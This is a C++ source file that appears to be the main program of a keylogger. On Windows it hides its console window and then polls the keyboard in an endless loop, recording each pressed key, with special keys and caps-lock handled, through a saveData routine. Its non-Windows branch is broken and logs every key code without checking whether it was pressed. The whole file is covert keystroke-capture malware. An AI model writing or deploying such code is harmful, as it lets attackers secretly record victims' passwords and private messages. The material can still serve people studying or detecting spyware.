#include "../Keylogging/src/headers/keylogging.hpp"

int main()
{
    int special_key_arr[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL};
    std::string special_key_char;
    bool is_special_key;

    #if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    #endif

    while(1)
    {
        for(int key = 8; key<=190; key++)
        {
            #if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
                if(GetAsyncKeyState(key) == -32767)
                {
                    is_special_key = std::find(std::begin(special_key_arr), std::end(special_key_arr), key) != std::end(special_key_arr);
                    if(is_special_key)
                    {
                        special_key_char = translateSpecialKey(key);
                        saveData(special_key_char);
                    }
                    else
                    {
                        if(GetKeyState(VK_CAPITAL))
                        {
                            saveData(std::string(1, (char)key));
                        }
                        else
                        {
                            saveData(std::string(1, (char)std::tolower(key)));
                        }
                    }
                }
            #else
                is_special_key = std::find(std::begin(special_key_arr), std::end(special_key_arr), key) != std::end(special_key_arr);
                if(is_special_key)
                {
                    special_key_char = translateSpecialKey(key);
                    saveData(special_key_char);
                }
                else
                {
                    saveData(std::string(1, (char)key));
                }
            #endif
        }
    }
    return 0;
}